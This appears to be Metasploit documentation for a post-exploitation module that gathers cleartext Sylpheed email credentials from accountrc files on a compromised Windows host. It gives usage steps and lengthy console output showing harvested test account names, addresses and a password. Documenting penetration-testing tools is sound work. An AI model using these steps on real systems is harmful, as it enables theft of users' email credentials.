## Vulnerable Application

This post-exploitation module extracts clear text credentials from the Sylpheed Email Client.

The Sylpheed Email Client is avaialble from (https://sylpheed.sraoss.jp/en/).

This module extracts information from the accountrc file in the "AppData\Roaming\Sylpheed" directory.

This module extracts server information such as account name, username, email address and password.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/sylpheed
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### Sylpheed v3.17.0 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Default Output
```
msf6 post(windows/gather/credentials/sylpheed) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Sylpheed's Accountrc file found
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc
[*] Sylpheed Accountrc downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508100023_default_10.0.0.2_Sylpheedaccountr_511987.bin

[+] account_name=tmctestface50@gmail.com
[+] account_name=TheTestBed@testers.com
[+] account_name=tmctestface50@gmail.com
[+] name=tmctestface50@gmail.com
[+] name=TestMcTestFace
[+] name=TheTestBed@testers.com
[+] name=Test
[+] name=Wojtek
[+] name=tmctestface50@gmail.com
[+] name=Testy
[+] address=tmctestface50@gmail.com
[+] address=TheTestBed@testers.com
[+] address=tmctestface50@gmail.com
[+] password=tiaspbiqe2r
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508100023_default_10.0.0.2_EXTRACTIONaccoun_507929.bin
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.1
[*] Sylpheed Accountrc.bak.1 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508100023_default_10.0.0.2_Sylpheedaccountr_329585.1

[+] account_name=tmctestface50@gmail.com
[+] account_name=TheTestBed@testers.com
[+] account_name=tmctestface50@gmail.com
[+] name=tmctestface50@gmail.com
[+] name=TestMcTestFace
[+] name=TheTestBed@testers.com
[+] name=Test
[+] name=Wojtek
[+] name=tmctestface50@gmail.com
[+] name=Testy
[+] address=tmctestface50@gmail.com
[+] address=TheTestBed@testers.com
[+] address=tmctestface50@gmail.com
[+] password=tiaspbiqe2r
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508100024_default_10.0.0.2_EXTRACTIONaccoun_146899.1
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak
[*] Sylpheed Accountrc.bak downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508100024_default_10.0.0.2_Sylpheedaccountr_450482.bak

[+] account_name=tmctestface50@gmail.com
[+] account_name=TheTestBed@testers.com
[+] account_name=tmctestface50@gmail.com
[+] name=tmctestface50@gmail.com
[+] name=TestMcTestFace
[+] name=TheTestBed@testers.com
[+] name=Test
[+] name=Wojtek
[+] name=tmctestface50@gmail.com
[+] name=Testy
[+] address=tmctestface50@gmail.com
[+] address=TheTestBed@testers.com
[+] address=tmctestface50@gmail.com
[+] password=tiaspbiqe2r
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508100024_default_10.0.0.2_EXTRACTIONaccoun_424899.bak
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.2
[*] Sylpheed Accountrc.bak.2 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508100024_default_10.0.0.2_Sylpheedaccountr_852103.2

[+] account_name=tmctestface50@gmail.com
[+] account_name=TheTestBed@testers.com
[+] account_name=tmctestface50@gmail.com
[+] name=tmctestface50@gmail.com
[+] name=TestMcTestFace
[+] name=TheTestBed@testers.com
[+] name=Test
[+] name=Wojtek
[+] name=tmctestface50@gmail.com
[+] name=Testy
[+] address=tmctestface50@gmail.com
[+] address=TheTestBed@testers.com
[+] address=tmctestface50@gmail.com
[+] password=tiaspbiqe2r
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508100024_default_10.0.0.2_EXTRACTIONaccoun_342490.2
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.3
[*] Sylpheed Accountrc.bak.3 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508100024_default_10.0.0.2_Sylpheedaccountr_575350.3

[+] account_name=tmctestface50@gmail.com
[+] account_name=TheTestBed@testers.com
[+] account_name=tmctestface50@gmail.com
[+] name=tmctestface50@gmail.com
[+] name=TestMcTestFace
[+] name=TheTestBed@testers.com
[+] name=Test
[+] name=Wojtek
[+] name=tmctestface50@gmail.com
[+] name=Testy
[+] address=tmctestface50@gmail.com
[+] address=TheTestBed@testers.com
[+] address=tmctestface50@gmail.com
[+] password=tiaspbiqe2r
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508100025_default_10.0.0.2_EXTRACTIONaccoun_038250.3
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.4
[*] Sylpheed Accountrc.bak.4 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508100025_default_10.0.0.2_Sylpheedaccountr_780534.4

[+] account_name=tmctestface50@gmail.com
[+] account_name=TheTestBed@testers.com
[+] account_name=tmctestface50@gmail.com
[+] name=tmctestface50@gmail.com
[+] name=TestMcTestFace
[+] name=TheTestBed@testers.com
[+] name=Test
[+] name=Wojtek
[+] name=tmctestface50@gmail.com
[+] name=Testy
[+] address=tmctestface50@gmail.com
[+] address=TheTestBed@testers.com
[+] address=tmctestface50@gmail.com
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508100025_default_10.0.0.2_EXTRACTIONaccoun_554415.4
[*] PackRat credential sweep Completed
[*] Post module execution completed

```

### Sylpheed v3.17.0 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Verbose Output
```

msf6 post(windows/gather/credentials/sylpheed) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Sylpheed's base folder not found in user's user directory

[*] Starting Packrat...
[*] Sylpheed's base folder found
[*] Found the folder containing specified artifact for accountrc.
[*] Sylpheed's Accountrc file found
[*] Processing C:\Users\test\AppData\Roaming\Sylpheed
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc
[*] Sylpheed Accountrc downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508095409_default_10.0.0.2_Sylpheedaccountr_913568.bin

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TestMcTestFace
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Wojtek
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Testy
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508095409_default_10.0.0.2_EXTRACTIONaccoun_539546.bin
[*] Processing C:\Users\test\AppData\Roaming\Sylpheed
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.1
[*] Sylpheed Accountrc.bak.1 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508095409_default_10.0.0.2_Sylpheedaccountr_194058.1

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TestMcTestFace
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Wojtek
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Testy
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508095410_default_10.0.0.2_EXTRACTIONaccoun_583721.1
[*] Processing C:\Users\test\AppData\Roaming\Sylpheed
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak
[*] Sylpheed Accountrc.bak downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508095410_default_10.0.0.2_Sylpheedaccountr_972346.bak

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TestMcTestFace
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Wojtek
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Testy
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=TheTestBed@testers.com

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508095410_default_10.0.0.2_EXTRACTIONaccoun_967284.bak
[*] Processing C:\Users\test\AppData\Roaming\Sylpheed
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.2
[*] Sylpheed Accountrc.bak.2 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508095410_default_10.0.0.2_Sylpheedaccountr_879167.2

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TestMcTestFace
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Wojtek
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Testy
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508095411_default_10.0.0.2_EXTRACTIONaccoun_021730.2
[*] Processing C:\Users\test\AppData\Roaming\Sylpheed
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.3
[*] Sylpheed Accountrc.bak.3 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508095411_default_10.0.0.2_Sylpheedaccountr_102901.3

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TestMcTestFace
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Wojtek
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Testy
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508095411_default_10.0.0.2_EXTRACTIONaccoun_544427.3
[*] Processing C:\Users\test\AppData\Roaming\Sylpheed
[*] Downloading C:\Users\test\AppData\Roaming\Sylpheed\accountrc.bak.4
[*] Sylpheed Accountrc.bak.4 downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508095411_default_10.0.0.2_Sylpheedaccountr_309871.4

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] account_name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TestMcTestFace
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Wojtek
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] name=Testy
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=TheTestBed@testers.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] address=tmctestface50@gmail.com
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] password=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508095411_default_10.0.0.2_EXTRACTIONaccoun_902434.4
[*] PackRat credential sweep Completed
[*] Post module execution completed


```
